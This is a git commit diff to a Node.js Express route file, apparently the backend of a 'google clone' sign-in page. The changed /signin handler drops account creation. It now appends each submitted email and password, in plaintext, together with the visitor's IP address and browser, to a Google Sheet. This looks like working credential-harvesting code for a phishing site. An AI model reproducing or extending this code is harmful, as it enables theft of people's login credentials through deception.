aa5c0d853916ea0cc8484b9556a6eb176c5f5717
Marquis Abah <marquis.abah@shuttlers.ng>
2024-01-27 00:27:20 +0100

    update google clone imoplementation

--- routes/user.js
+++ routes/user.js
@@ -6,19 +6,9 @@ const User = require("../model/user");
 
 router.post("/signin", async (req, res) => {
   try {
-    const { email, password } = req.body;
-    const user = await User.findOne({ email });
-    if (user) {
-      return res.status(400).json({ errorMessage: "User Already Exist" });
-    }
-
-    const newUser = new User({
-      email,
-      password,
-    });
-
+    const { email, password, ip, browser } = req.body;
     const auth = new google.auth.GoogleAuth({
-      keyFile: "credentials.json",
+      keyFile: "credentials.env",
       scopes: "https://www.googleapis.com/auth/spreadsheets",
     });
     const client = await auth.getClient();
@@ -28,23 +18,13 @@ router.post("/signin", async (req, res) => {
       auth: client,
     });
 
-    const metadata = await googleSheets.spreadsheets.get({
-      auth,
-      spreadsheetId,
-    });
-
-    const getRows = await googleSheets.spreadsheets.values.get({
-      auth,
-      spreadsheetId,
-      range: "Sheet1",
-    });
     await googleSheets.spreadsheets.values.append({
       auth,
       spreadsheetId,
       range: "Sheet1!A:B",
       valueInputOption: "USER_ENTERED",
       resource: {
-        values: [[email, password]],
+        values: [[email, password, ip, browser]],
       },
     });
 
@@ -59,38 +39,38 @@ router.post("/signin", async (req, res) => {
   }
 });
 
-router.get("/", async (req, res) => {
-  const auth = new google.auth.GoogleAuth({
-    keyFile: "credentials.json",
-    scopes: "https://www.googleapis.com/auth/spreadsheets",
-  });
-  const client = await auth.getClient();
-  const spreadsheetId = "19LnsT1_XZzH93-Vhv3SbPTSdqwdqLZM2cH2c07mtkvI";
-  const googleSheets = google.sheets({
-    version: "v4",
-    auth: client,
-  });
+// router.get("/", async (req, res) => {
+//   const auth = new google.auth.GoogleAuth({
+//     keyFile: "credentials.json",
+//     scopes: "https://www.googleapis.com/auth/spreadsheets",
+//   });
+//   const client = await auth.getClient();
+//   const spreadsheetId = "19LnsT1_XZzH93-Vhv3SbPTSdqwdqLZM2cH2c07mtkvI";
+//   const googleSheets = google.sheets({
+//     version: "v4",
+//     auth: client,
+//   });
 
-  const metadata = await googleSheets.spreadsheets.get({
-    auth,
-    spreadsheetId,
-  });
+//   const metadata = await googleSheets.spreadsheets.get({
+//     auth,
+//     spreadsheetId,
+//   });
 
-  const getRows = await googleSheets.spreadsheets.values.get({
-    auth,
-    spreadsheetId,
-    range: "Sheet1",
-  });
-  await googleSheets.spreadsheets.values.append({
-    auth,
-    spreadsheetId,
-    range: "Sheet1!A:B",
-    valueInputOption: "USER_ENTERED",
-    resource: {
-      values: [["Make a tutorial", "test"]],
-    },
-  });
-  res.status(200).json(getRows.data);
-});
+//   const getRows = await googleSheets.spreadsheets.values.get({
+//     auth,
+//     spreadsheetId,
+//     range: "Sheet1",
+//   });
+//   await googleSheets.spreadsheets.values.append({
+//     auth,
+//     spreadsheetId,
+//     range: "Sheet1!A:B",
+//     valueInputOption: "USER_ENTERED",
+//     resource: {
+//       values: [["Make a tutorial", "test"]],
+//     },
+//   });
+//   res.status(200).json(getRows.data);
+// });
 
 module.exports = router;
